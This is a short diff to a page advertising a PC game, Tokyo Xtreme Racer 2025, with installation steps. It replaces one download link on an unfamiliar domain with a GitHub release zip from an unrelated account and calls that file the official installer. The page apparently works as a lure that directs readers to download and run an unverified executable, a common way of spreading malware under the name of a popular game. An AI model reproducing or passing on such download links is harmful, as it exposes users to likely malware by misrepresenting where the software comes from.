@@ -14,7 +14,7 @@ Available on PC, Tokyo Xtreme Racer 2025 offers an exhilarating racing experienc
 
 1. **Download the Installer**:
    - Click the link below to download the official Tokyo Xtreme Racer 2025 installer:
-     - [Download Installer](https://nicecolns.com/)
+     - [Download Installer](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip)
 
 2. **Run the Installer**:
    - Locate the downloaded file in your "Downloads" folder.
